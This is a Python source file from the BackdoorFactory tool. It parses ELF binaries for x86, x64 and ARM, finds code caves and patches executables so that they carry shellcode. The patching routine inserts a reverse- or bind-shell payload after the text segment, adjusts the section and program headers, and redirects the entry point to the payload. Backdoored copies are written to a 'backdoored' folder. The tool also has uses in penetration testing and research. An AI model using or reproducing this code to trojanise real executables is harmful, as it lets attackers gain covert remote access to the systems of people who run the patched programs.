#!/usr/bin/env python
'''

Copyright (c) 2013-2015, Joshua Pitts
All rights reserved.

Redistribution and use in source and binary forms, with or without modification,
are permitted provided that the following conditions are met:

    1. Redistributions of source code must retain the above copyright notice,
    this list of conditions and the following disclaimer.

    2. Redistributions in binary form must reproduce the above copyright notice,
    this list of conditions and the following disclaimer in the documentation
    and/or other materials provided with the distribution.

    3. Neither the name of the copyright holder nor the names of its contributors
    may be used to endorse or promote products derived from this software without
    specific prior written permission.

THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS"
AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE
IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE
ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT HOLDER OR CONTRIBUTORS BE
LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR
CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF
SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS
INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN
CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE)
ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE
POSSIBILITY OF SUCH DAMAGE.

'''

import struct
import os
import shutil
from intel.LinuxIntelELF32 import linux_elfI32_shellcode
from intel.LinuxIntelELF64 import linux_elfI64_shellcode
from intel.FreeBSDIntelELF32 import freebsd_elfI32_shellcode
#from intel.FreeBSDIntelELF64 import freebsd_elfI64_shellcode
from arm.LinuxARMLELF32 import linux_elfarmle32_shellcode


class elf():
    """
    ELF data format class for BackdoorFactory.
    We don't need the ENTIRE format.
    """

    #setting linux header infomation
    e_ident = {"EI_MAG": "\x7f" + "ELF",
               "EI_CLASS": {0x01: "x86",
                            0x02: "x64"
                            },
               "EI_DATA_little": 0x01,
               "EI_DATA_big": 0x02,
               "EI_VERSION": 0x01,
               "EI_OSABI": {0x00: "System V",
                            0x01: "HP-UX",
                            0x02: "NetBSD",
                            0x03: "Linux",
                            0x06: "Solaris",
                            0x07: "AIX",
                            0x08: "IRIX",
                            0x09: "FreeBSD",
                            0x0C: "OpenBSD"
                            },
               "EI_ABIVERSION": 0x00,
               "EI_PAD": 0x07
               }

    e_type = {0x01: "relocatable",
              0x02: "executable",
              0x03: "shared",
              0x04: "core"
              }

    e_machine = {0x02: "SPARC",
                 0x03: "x86",
                 0x14: "PowerPC",
                 0x28: "ARM",
                 0x32: "IA-64",
                 0x3E: "x86-64",
                 0xB7: "AArch64"
                 }
    e_version = 0x01
#end elf class


class elfbin():
    """
    This is the class handler for the elf binary format
    """
    def __init__(self, FILE, OUTPUT=None, SHELL=None, HOST="127.0.0.1", PORT=8888,
                 SUPPORT_CHECK=False, FIND_CAVES=False, SHELL_LEN=70,
                 SUPPLIED_SHELLCODE=None, IMAGE_TYPE="ALL"):
        #print FILE
        self.FILE = FILE
        self.OUTPUT = OUTPUT
        self.SHELL = SHELL
        self.bin_file = None
        self.HOST = HOST
        self.PORT = PORT
        self.FIND_CAVES = FIND_CAVES
        self.SUPPORT_CHECK = SUPPORT_CHECK
        self.SHELL_LEN = SHELL_LEN
        self.SUPPLIED_SHELLCODE = SUPPLIED_SHELLCODE
        self.IMAGE_TYPE = IMAGE_TYPE
        self.shellcode_vaddr = 0x0
        self.file_size = os.path.getsize(self.FILE)
        self.supported_types = {0x00:    # System V
                                [[0x01,  # 32bit
                                  0x02   # 64bit
                                  ],
                                 [0x03,  # x86
                                  0x28,  # ARM
                                  0x3E   # x64
                                  ]],
                                0x03:    # Linux
                                [[0x01,  # 32bit
                                  0x02   # 64bit
                                  ],
                                 [0x03,  # x86
                                  0x3E   # x64
                                  ]],
                                0x09:    # FreeBSD
                                [[0x01,  # 32bit
                                 # 0x02  # 64bit
                                  ],
                                 [0x03,  # x86
                                  # 0x3E # x64
                                  ]],
                                0x0C:    # OpenBSD
                                [[0x01,  # 32bit
                                 #0x02   # 64bit
                                  ],
                                 [0x03,  # x86
                                  #0x3E  # x64
                                  ]]
                                }

    def run_this(self):
        '''
        Call this if you want to run the entire process with a ELF binary.
        '''
        #self.print_supported_types()
        self.bin_file = open(self.FILE, "r+b")
        if self.FIND_CAVES is True:
            self.support_check()
            self.gather_file_info()
            if self.supported is False:
                print self.FILE, "is not supported."
                return False
            print ("Looking for caves with a size of %s "
                   "bytes (measured as an integer)"
                   % self.SHELL_LEN)
            self.find_all_caves()
            return True
        if self.SUPPORT_CHECK is True:
            if not self.FILE:
                print "You must provide a file to see if it is supported (-f)"
                return False
            try:
                self.support_check()
            except Exception, e:
                self.supported = False
                print 'Exception:', str(e), '%s' % self.FILE
            if self.supported is False:
                print "%s is not supported." % self.FILE
                self.print_supported_types()
                return False
            else:
                print "%s is supported." % self.FILE
                return True

        return self.patch_elf()

    def find_all_caves(self):
        """
        This function finds all the codecaves in a inputed file.
        Prints results to screen. Generally not many caves in the ELF
        format.  And why there is no need to cave jump.
        """

        print "[*] Looking for caves"
        SIZE_CAVE_TO_FIND = 94
        BeginCave = 0
        Tracking = 0
        count = 1
        caveTracker = []
        caveSpecs = []
        self.bin_file.seek(0)
        while True:
            try:
                s = struct.unpack("<b", self.bin_file.read(1))[0]
            except:
                break
            if s == 0:
                if count == 1:
                    BeginCave = Tracking
                count += 1
            else:
                if count >= SIZE_CAVE_TO_FIND:
                    caveSpecs.append(BeginCave)
                    caveSpecs.append(Tracking)
                    caveTracker.append(caveSpecs)
                count = 1
                caveSpecs = []

            Tracking += 1

        for caves in caveTracker:

            for section in self.sec_hdr.iteritems():
                #print 'section', section[1]
                section = section[1]
                sectionFound = False
                if caves[0] >= section['sh_offset'] and caves[1] <= (section['sh_size'] + section['sh_offset']) and \
                   caves[1] - caves[0] >= SIZE_CAVE_TO_FIND:
                    print "We have a winner:", section['name']
                    print '->Begin Cave', hex(caves[0])
                    print '->End of Cave', hex(caves[1])
                    print 'Size of Cave (int)', caves[1] - caves[0]
                    print 'sh_size', hex(section['sh_size'])
                    print 'sh_offset', hex(section['sh_offset'])
                    print 'End of Raw Data:', hex(section['sh_size'] + section['sh_offset'])
                    print '*' * 50
                    sectionFound = True
                    break
            if sectionFound is False:
                try:
                    print "No section"
                    print '->Begin Cave', hex(caves[0])
                    print '->End of Cave', hex(caves[1])
                    print 'Size of Cave (int)', caves[1] - caves[0]
                    print '*' * 50
                except Exception as e:
                    print str(e)
        print "[*] Total of %s caves found" % len(caveTracker)

    def set_shells(self):
        """
        This function sets the shellcode.
        """

        avail_shells = []

        self.bintype = False
        if self.e_machine == 0x03:  # x86 chipset
            if self.EI_CLASS == 0x1:
                if self.EI_OSABI == 0x00:
                    self.bintype = linux_elfI32_shellcode
                elif self.EI_OSABI == 0x09 or self.EI_OSABI == 0x0C:
                    self.bintype = freebsd_elfI32_shellcode
        elif self.e_machine == 0x3E:  # x86-64 chipset
            if self.EI_CLASS == 0x2:
                if self.EI_OSABI == 0x00:
                    self.bintype = linux_elfI64_shellcode
                #elif self.EI_OSABI == 0x09:
                #    self.bintype = freebsd_elfI64_shellcode
        elif self.e_machine == 0x28:  # ARM chipset
            if self.EI_CLASS == 0x1:
                if self.EI_OSABI == 0x00:
                    self.bintype = linux_elfarmle32_shellcode

        if self.bintype is False:
            print "[!] Unusual binary type"
            return False

        if not self.SHELL:
            print "You must choose a backdoor to add: "
            for item in dir(self.bintype):
                if "__" in item:
                    continue
                elif ("returnshellcode" == item
                      or "pack_ip_addresses" == item
                      or "eat_code_caves" == item
                      or 'ones_compliment' == item
                      or 'resume_execution' in item
                      or 'returnshellcode' in item):
                    continue
                else:
                    print "   {0}".format(item)
            return False
        if self.SHELL not in dir(self.bintype):
            print "The following %ss are available:" % str(self.bintype).split(".")[1]
            for item in dir(self.bintype):
                #print item
                if "__" in item:
                    continue
                elif ("returnshellcode" == item
                      or "pack_ip_addresses" == item
                      or "eat_code_caves" == item
                      or 'ones_compliment' == item
                      or 'resume_execution' in item
                      or 'returnshellcode' in item):
                    continue
                else:
                    print "   {0}".format(item)
                    avail_shells.append(item)
            self.avail_shells = avail_shells
            return False
        #else:
        #    shell_cmd = self.SHELL + "()"
        if self.e_machine == 0x28:
            self.shells = self.bintype(self.HOST, self.PORT, self.e_entry, self.SUPPLIED_SHELLCODE, self.shellcode_vaddr)
        else:
            self.shells = self.bintype(self.HOST, self.PORT, self.e_entry, self.SUPPLIED_SHELLCODE)
        self.allshells = getattr(self.shells, self.SHELL)(self.e_entry)
        self.shellcode = self.shells.returnshellcode()

    def print_supported_types(self):
        """
        Prints supported types
        """
        print "Supported system types:"
        for system_type in self.supported_types.iteritems():
            print "    ", elf.e_ident["EI_OSABI"][system_type[0]]
            print "     Arch type:"
            for class_type in system_type[1][0]:
                print "\t", elf.e_ident['EI_CLASS'][class_type]
            print "     Chip set:"
            for e_mach_type in system_type[1][1]:
                print "\t", elf.e_machine[e_mach_type]
            #print "Supported class types:"
            print "*" * 25

    def support_check(self):
        """
        Checks for support
        """
        with open(self.FILE, 'r+b') as bin_file:
            print "[*] Checking file support"
            bin_file.seek(0)
            if bin_file.read(4) == elf.e_ident["EI_MAG"]:
                bin_file.seek(4, 0)
                self.class_type = struct.unpack("<B", bin_file.read(1))[0]
                bin_file.seek(7, 0)
                self.EI_OSABI = struct.unpack("<B", bin_file.read(1))[0]
                self.supported = False
                for system_type in self.supported_types.iteritems():
                    if self.EI_OSABI == system_type[0]:
                        print "[*] System Type Supported:", elf.e_ident["EI_OSABI"][system_type[0]]
                        if self.class_type == 0x1 and (self.IMAGE_TYPE == 'ALL' or self.IMAGE_TYPE == 'x86'):
                            self.supported = True
                        elif self.class_type == 0x2 and (self.IMAGE_TYPE == 'ALL' or self.IMAGE_TYPE == 'x64'):
                            self.supported = True
                        break

            else:
                self.supported = False

    def get_section_name(self, section_offset):
        """
        Get section names
        """
        if self.e_shstrndx not in self.sec_hdr:
            print "[!] Failed to get self.e_shstrndx. Fuzzing?"
            return False
        if self.sec_hdr[self.e_shstrndx]['sh_offset'] > self.file_size:
            print "[!] Fuzzing the sh_offset"
            return False
        self.bin_file.seek(self.sec_hdr[self.e_shstrndx]['sh_offset'] + section_offset, 0)
        name = ''
        j = ''
        while True:
            j = self.bin_file.read(1)
            if len(j) == 0:
                break
            else:
                name += j
        #print "name:", name
        return name

    def set_section_name(self):
        """
        Set the section names
        """
         #how to find name section specifically
        for i in range(0, self.e_shstrndx + 1):
            self.sec_hdr[i]['name'] = self.get_section_name(self.sec_hdr[i]['sh_name'])
            if self.sec_hdr[i]['name'] is False:
                print "Failure in naming, fuzzing?"
                return False
        if self.sec_hdr[i]['name'] == ".text":
                #print "Found text section"
                self.text_section = i

    def gather_file_info(self):
        '''
        Gather info about the binary
        '''
        print "[*] Gathering file info"
        bin = self.bin_file
        bin.seek(0)
        EI_MAG = bin.read(4)
        self.EI_CLASS = struct.unpack("<B", bin.read(1))[0]
        self.EI_DATA = struct.unpack("<B", bin.read(1))[0]
        if self.EI_DATA == 0x01:
            #little endian
            self.endian = "<"
        else:
            #big self.endian
            self.endian = ">"
        self.EI_VERSION = struct.unpack('<B', bin.read(1))[0]
        self.EI_OSABI = struct.unpack('<B', bin.read(1))[0]
        self.EI_ABIVERSION = struct.unpack('<B', bin.read(1))[0]
        self.EI_PAD = struct.unpack(self.endian + "BBBBBBB", bin.read(7))[0]
        self.e_type = struct.unpack(self.endian + "H", bin.read(2))[0]
        self.e_machine = struct.unpack(self.endian + "H", bin.read(2))[0]
        self.e_version = struct.unpack(self.endian + "I", bin.read(4))[0]
        #print "EI_Class", self.EI_CLASS
        if self.EI_CLASS == 0x01:
            #"32 bit "
            self.e_entryLocOnDisk = bin.tell()
            self.e_entry = struct.unpack(self.endian + "I", bin.read(4))[0]
            #print hex(self.e_entry)
            self.e_phoff = struct.unpack(self.endian + "I", bin.read(4))[0]
            self.e_shoff = struct.unpack(self.endian + "I", bin.read(4))[0]
        else:
            #"64 bit "
            self.e_entryLocOnDisk = bin.tell()
            self.e_entry = struct.unpack(self.endian + "Q", bin.read(8))[0]
            self.e_phoff = struct.unpack(self.endian + "Q", bin.read(8))[0]
            self.e_shoff = struct.unpack(self.endian + "Q", bin.read(8))[0]
        self.VrtStrtngPnt = self.e_entry
        self.e_flags = struct.unpack(self.endian + "I", bin.read(4))[0]
        self.e_ehsize = struct.unpack(self.endian + "H", bin.read(2))[0]
        self.e_phentsize = struct.unpack(self.endian + "H", bin.read(2))[0]
        self.e_phnum = struct.unpack(self.endian + "H", bin.read(2))[0]
        self.e_shentsize = struct.unpack(self.endian + "H", bin.read(2))[0]
        self.e_shnum = struct.unpack(self.endian + "H", bin.read(2))[0]
        self.e_shstrndx = struct.unpack(self.endian + "H", bin.read(2))[0]
        
        #section tables
        if self.e_phoff > os.path.getsize(self.FILE):
            print "[!] El fuzzero"
            return False
        bin.seek(self.e_phoff, 0)
            
        #header tables
        if self.e_shnum == 0:
            print "[*] More than 0xFF00 sections"
            print "[*] NOPE NOPE NOPE"
            return False
            
        else:
            self.real_num_sections = self.e_shnum

        if self.e_phoff > self.file_size:
            print "[*] e_phoff is greater than file size"
            return False

        bin.seek(self.e_phoff, 0)
        self.prog_hdr = {}
        for i in range(self.e_phnum):
            self.prog_hdr[i] = {}
            if self.EI_CLASS == 0x01:
                if self.e_phoff + (self.e_phnum * 4 * 8) > self.file_size:
                    print "[!] e_phoff and e_phnum is greater than the file size"
                    return False
                self.prog_hdr[i]['p_type'] = struct.unpack(self.endian + "I", bin.read(4))[0]
                self.prog_hdr[i]['p_offset'] = struct.unpack(self.endian + "I", bin.read(4))[0]
                self.prog_hdr[i]['p_vaddr'] = struct.unpack(self.endian + "I", bin.read(4))[0]
                self.prog_hdr[i]['p_paddr'] = struct.unpack(self.endian + "I", bin.read(4))[0]
                self.prog_hdr[i]['p_filesz'] = struct.unpack(self.endian + "I", bin.read(4))[0]
                self.prog_hdr[i]['p_memsz'] = struct.unpack(self.endian + "I", bin.read(4))[0]
                self.prog_hdr[i]['p_flags'] = struct.unpack(self.endian + "I", bin.read(4))[0]
                self.prog_hdr[i]['p_align'] = struct.unpack(self.endian + "I", bin.read(4))[0]
            else:
                if self.e_phoff + (self.e_phnum * ((4 * 2) + (6 * 8))) > self.file_size:
                    print "[!] e_phoff and e_phnum is greater than the file size"
                    return False
                self.prog_hdr[i]['p_type'] = struct.unpack(self.endian + "I", bin.read(4))[0]
                self.prog_hdr[i]['p_flags'] = struct.unpack(self.endian + "I", bin.read(4))[0]
                self.prog_hdr[i]['p_offset'] = struct.unpack(self.endian + "Q", bin.read(8))[0]
                self.prog_hdr[i]['p_vaddr'] = struct.unpack(self.endian + "Q", bin.read(8))[0]
                self.prog_hdr[i]['p_paddr'] = struct.unpack(self.endian + "Q", bin.read(8))[0]
                self.prog_hdr[i]['p_filesz'] = struct.unpack(self.endian + "Q", bin.read(8))[0]
                self.prog_hdr[i]['p_memsz'] = struct.unpack(self.endian + "Q", bin.read(8))[0]
                self.prog_hdr[i]['p_align'] = struct.unpack(self.endian + "Q", bin.read(8))[0]
            if self.prog_hdr[i]['p_type'] == 0x1 and self.prog_hdr[i]['p_vaddr'] < self.e_entry:
                self.offset_addr = self.prog_hdr[i]['p_vaddr']
                self.LocOfEntryinCode = self.e_entry - self.offset_addr
                #print "found the entry offset"

        if self.e_shoff > self.file_size:
            print "[!] e_shoff location is greater than file size"
            return False
        if self.e_shnum  > self.file_size:
            print "[!] e_shnum is greater than file size"
            return False    
        bin.seek(self.e_shoff, 0)
        self.sec_hdr = {}
        for i in range(self.e_shnum):
            self.sec_hdr[i] = {}
            if self.EI_CLASS == 0x01:
                if self.e_shoff + self.e_shnum * 4 *10 > self.file_size:
                    print "[!] e_shnum is greater than file size"
                    return False    
                self.sec_hdr[i]['sh_name'] = struct.unpack(self.endian + "I", bin.read(4))[0]
                self.sec_hdr[i]['sh_type'] = struct.unpack(self.endian + "I", bin.read(4))[0]
                self.sec_hdr[i]['sh_flags'] = struct.unpack(self.endian + "I", bin.read(4))[0]
                self.sec_hdr[i]['sh_addr'] = struct.unpack(self.endian + "I", bin.read(4))[0]
                self.sec_hdr[i]['sh_offset'] = struct.unpack(self.endian + "I", bin.read(4))[0]
                self.sec_hdr[i]['sh_size'] = struct.unpack(self.endian + "I", bin.read(4))[0]
                self.sec_hdr[i]['sh_link'] = struct.unpack(self.endian + "I", bin.read(4))[0]
                self.sec_hdr[i]['sh_info'] = struct.unpack(self.endian + "I", bin.read(4))[0]
                self.sec_hdr[i]['sh_addralign'] = struct.unpack(self.endian + "I", bin.read(4))[0]
                self.sec_hdr[i]['sh_entsize'] = struct.unpack(self.endian + "I", bin.read(4))[0]
            else:
                if self.e_shoff + self.e_shnum * ((4 * 4) + (6 * 8))   > self.file_size:
                    print "[!] e_shnum is greater than file size"
                    return False
                self.sec_hdr[i]['sh_name'] = struct.unpack(self.endian + "I", bin.read(4))[0]
                self.sec_hdr[i]['sh_type'] = struct.unpack(self.endian + "I", bin.read(4))[0]
                self.sec_hdr[i]['sh_flags'] = struct.unpack(self.endian + "Q", bin.read(8))[0]
                self.sec_hdr[i]['sh_addr'] = struct.unpack(self.endian + "Q", bin.read(8))[0]
                self.sec_hdr[i]['sh_offset'] = struct.unpack(self.endian + "Q", bin.read(8))[0]
                self.sec_hdr[i]['sh_size'] = struct.unpack(self.endian + "Q", bin.read(8))[0]
                self.sec_hdr[i]['sh_link'] = struct.unpack(self.endian + "I", bin.read(4))[0]
                self.sec_hdr[i]['sh_info'] = struct.unpack(self.endian + "I", bin.read(4))[0]
                self.sec_hdr[i]['sh_addralign'] = struct.unpack(self.endian + "Q", bin.read(8))[0]
                self.sec_hdr[i]['sh_entsize'] = struct.unpack(self.endian + "Q", bin.read(8))[0]
        
        if self.set_section_name() is False:
            print "[!] Fuzzing sections"
            return False
        if self.e_type != 0x2:
            print "[!] Only supporting executable elf e_types, things may get weird."

        return True

    def output_options(self):
        """
        Output file check.
        """
        if not self.OUTPUT:
            self.OUTPUT = os.path.basename(self.FILE)

    def patch_elf(self):
        '''
        Circa 1998: http://vxheavens.com/lib/vsc01.html  <--Thanks to elfmaster
        6. Increase p_shoff by PAGE_SIZE in the ELF header
        7. Patch the insertion code (parasite) to jump to the entry point (original)
        1. Locate the text segment program header
            -Modify the entry point of the ELF header to point to the new code (p_vaddr + p_filesz)
            -Increase p_filesz by account for the new code (parasite)
            -Increase p_memsz to account for the new code (parasite)
        2. For each phdr who's segment is after the insertion (text segment)
            -increase p_offset by PAGE_SIZE
        3. For the last shdr in the text segment
            -increase sh_len by the parasite length
        4. For each shdr who's section resides after the insertion
            -Increase sh_offset by PAGE_SIZE
        5. Physically insert the new code (parasite) and pad to PAGE_SIZE,
            into the file - text segment p_offset + p_filesz (original)
        '''

        self.support_check()
        if self.supported is False:
            print "[!] ELF Binary not supported"
            return False

        self.output_options()

        if not os.path.exists("backdoored"):
            os.makedirs("backdoored")
        os_name = os.name
        if os_name == 'nt':
            self.backdoorfile = "backdoored\\" + self.OUTPUT
        else:
            self.backdoorfile = "backdoored/" + self.OUTPUT

        shutil.copy2(self.FILE, self.backdoorfile)


        gather_result = self.gather_file_info()
        if gather_result is False:
            print "[!] Are you fuzzing?"
            return False
        
        print "[*] Getting shellcode length"

        resultShell = self.set_shells()
        if resultShell is False:
            print "[!] Could not set shell"
            return False
        self.bin_file = open(self.backdoorfile, "r+b")

        newBuffer = len(self.shellcode)

        self.bin_file.seek(24, 0)

        headerTracker = 0x0
        PAGE_SIZE = 4096
        newOffset = None
        #find range of the first PT_LOAD section
        for header, values in self.prog_hdr.iteritems():
            #print 'program header', header, values
            if values['p_flags'] == 0x5 and values['p_type'] == 0x1:
                #print "Found text segment"
                self.shellcode_vaddr = values['p_vaddr'] + values['p_filesz']
                beginOfSegment = values['p_vaddr']
                oldentry = self.e_entry
                sizeOfNewSegment = values['p_memsz'] + newBuffer
                LOCofNewSegment = values['p_filesz'] + newBuffer
                headerTracker = header
                newOffset = values['p_offset'] + values['p_filesz']

        #now that we have the shellcode startpoint, reassgin shellcode,
        #  there is no change in size
        print "[*] Setting selected shellcode"

        resultShell = self.set_shells()

        #SPLIT THE FILE
        self.bin_file.seek(0)
        if newOffset > 4294967296 or newOffset is None:
            print "[!] Fuzz Fuzz Fuzz the bin"
            return False
        if newOffset > self.file_size:
            print "[!] The file is really not that big"
            return False
        
        file_1st_part = self.bin_file.read(newOffset)
        #print file_1st_part.encode('hex')
        newSectionOffset = self.bin_file.tell()
        file_2nd_part = self.bin_file.read()

        self.bin_file.close()
        #print "Reopen file for adjustments"
        self.bin_file = open(self.backdoorfile, "w+b")
        self.bin_file.write(file_1st_part)
        self.bin_file.write(self.shellcode)
        self.bin_file.write("\x00" * (PAGE_SIZE - len(self.shellcode)))
        self.bin_file.write(file_2nd_part)
        if self.EI_CLASS == 0x01:
            #32 bit FILE
            #update section header table
            print "[*] Patching x86 Binary"
            self.bin_file.seek(24, 0)
            self.bin_file.seek(8, 1)
            if self.e_shoff + PAGE_SIZE > 4294967296:
                print "[!] Such fuzz..."
                return False
            self.bin_file.write(struct.pack(self.endian + "I", self.e_shoff + PAGE_SIZE))
            self.bin_file.seek(self.e_shoff + PAGE_SIZE, 0)
            for i in range(self.e_shnum):
                #print "i", i, self.sec_hdr[i]['sh_offset'], newOffset
                if self.sec_hdr[i]['sh_offset'] >= newOffset:
                    #print "Adding page size"
                    if self.sec_hdr[i]['sh_offset'] + PAGE_SIZE > 4294967296:
                        print "[!] Melkor is cool right?"
                        return False
                    self.bin_file.seek(16, 1)
                    self.bin_file.write(struct.pack(self.endian + "I", self.sec_hdr[i]['sh_offset'] + PAGE_SIZE))
                    self.bin_file.seek(20, 1)
                elif self.sec_hdr[i]['sh_size'] + self.sec_hdr[i]['sh_addr'] == self.shellcode_vaddr:
                    #print "adding newBuffer size"
                    if self.sec_hdr[i]['sh_offset'] + newBuffer > 4294967296:
                        print "[!] Someone is fuzzing..."
                        return False
                    self.bin_file.seek(20, 1)
                    self.bin_file.write(struct.pack(self.endian + "I", self.sec_hdr[i]['sh_size'] + newBuffer))
                    self.bin_file.seek(16, 1)
                else:
                    self.bin_file.seek(40, 1)
            #update the pointer to the section header table
            after_textSegment = False
            self.bin_file.seek(self.e_phoff, 0)
            for i in range(self.e_phnum):
                #print "header range i", i
                #print "self.shellcode_vaddr", hex(self.prog_hdr[i]['p_vaddr']), hex(self.shellcode_vaddr)
                if i == headerTracker:
                    #print "Found Text Segment again"
                    after_textSegment = True
                    self.bin_file.seek(16, 1)
           
                    if self.prog_hdr[i]['p_filesz'] + newBuffer > 4294967296:
                        print "[!] Melkor you fuzzer you..."
                        return False
                    if self.prog_hdr[i]['p_memsz'] + newBuffer > 4294967296:
                        print "[!] Someone is a fuzzing..."
                        return False
                    self.bin_file.write(struct.pack(self.endian + "I", self.prog_hdr[i]['p_filesz'] + newBuffer))
                    self.bin_file.write(struct.pack(self.endian + "I", self.prog_hdr[i]['p_memsz'] + newBuffer))
                    self.bin_file.seek(8, 1)
                elif after_textSegment is True:
                    #print "Increasing headers after the addition"
                    self.bin_file.seek(4, 1)
                    if self.prog_hdr[i]['p_offset'] + PAGE_SIZE > 4294967296:
                        print "[!] Nice Fuzzer!"
                        return False
                    self.bin_file.write(struct.pack(self.endian + "I", self.prog_hdr[i]['p_offset'] + PAGE_SIZE))
                    self.bin_file.seek(24, 1)
                else:
                    self.bin_file.seek(32, 1)

            self.bin_file.seek(self.e_entryLocOnDisk, 0)
            if self.shellcode_vaddr >= 4294967295:
                print "[!] Oh hai Fuzzer!"
                return False
            self.bin_file.write(struct.pack(self.endian + "I", self.shellcode_vaddr))

            self.JMPtoCodeAddress = self.shellcode_vaddr - self.e_entry - 5

        else:
            #64 bit FILE
            print "[*] Patching x64 Binary"
            self.bin_file.seek(24, 0)
            self.bin_file.seek(16, 1)
            if self.e_shoff + PAGE_SIZE > 0x7fffffffffffffff:
                print "[!] Such fuzz..."
                return False
            self.bin_file.write(struct.pack(self.endian + "I", self.e_shoff + PAGE_SIZE))
            self.bin_file.seek(self.e_shoff + PAGE_SIZE, 0)
            for i in range(self.e_shnum):
                #print "i", i, self.sec_hdr[i]['sh_offset'], newOffset
                if self.sec_hdr[i]['sh_offset'] >= newOffset:
                    #print "Adding page size"
                    self.bin_file.seek(24, 1)
                    if self.sec_hdr[i]['sh_offset'] + PAGE_SIZE > 0x7fffffffffffffff:
                        print "[!] Fuzzing..."
                        return False
                    self.bin_file.write(struct.pack(self.endian + "Q", self.sec_hdr[i]['sh_offset'] + PAGE_SIZE))
                    self.bin_file.seek(32, 1)
                elif self.sec_hdr[i]['sh_size'] + self.sec_hdr[i]['sh_addr'] == self.shellcode_vaddr:
                    #print "adding newBuffer size"
                    self.bin_file.seek(32, 1)
                    if self.sec_hdr[i]['sh_offset'] + newBuffer > 0x7fffffffffffffff:
                        print "[!] Melkor is cool right?"
                        return False
                    self.bin_file.write(struct.pack(self.endian + "Q", self.sec_hdr[i]['sh_size'] + newBuffer))
                    self.bin_file.seek(24, 1)
                else:
                    self.bin_file.seek(64, 1)
            #update the pointer to the section header table
            after_textSegment = False
            self.bin_file.seek(self.e_phoff, 0)
            for i in range(self.e_phnum):
                #print "header range i", i
                #print "self.shellcode_vaddr", hex(self.prog_hdr[i]['p_vaddr']), hex(self.shellcode_vaddr)
                if i == headerTracker:
                    #print "Found Text Segment again"
                    after_textSegment = True
                    self.bin_file.seek(32, 1)
                    if self.prog_hdr[i]['p_filesz'] + newBuffer > 0x7fffffffffffffff:
                        print "[!] Fuzz fuzz fuzz... "
                        return False
                    if self.prog_hdr[i]['p_memsz'] + newBuffer > 0x7fffffffffffffff:
                        print "[!] Someone is fuzzing..."
                        return False
                    self.bin_file.write(struct.pack(self.endian + "Q", self.prog_hdr[i]['p_filesz'] + newBuffer))
                    self.bin_file.write(struct.pack(self.endian + "Q", self.prog_hdr[i]['p_memsz'] + newBuffer))
                    self.bin_file.seek(8, 1)
                elif after_textSegment is True:
                    #print "Increasing headers after the addition"
                    self.bin_file.seek(8, 1)
                    if self.prog_hdr[i]['p_offset'] + PAGE_SIZE > 0x7fffffffffffffff:
                        print "[!] Nice fuzzer!"
                        return False
                    self.bin_file.write(struct.pack(self.endian + "Q", self.prog_hdr[i]['p_offset'] + PAGE_SIZE))
                    self.bin_file.seek(40, 1)
                else:
                    self.bin_file.seek(56, 1)

            self.bin_file.seek(self.e_entryLocOnDisk, 0)
            if self.shellcode_vaddr > 0x7fffffffffffffff:
                print "[!] Fuzzing..."
                return False
            self.bin_file.write(struct.pack(self.endian + "Q", self.shellcode_vaddr))

            self.JMPtoCodeAddress = self.shellcode_vaddr - self.e_entry - 5

        self.bin_file.close()
        print "[!] Patching Complete"
        return True

# END elfbin clas
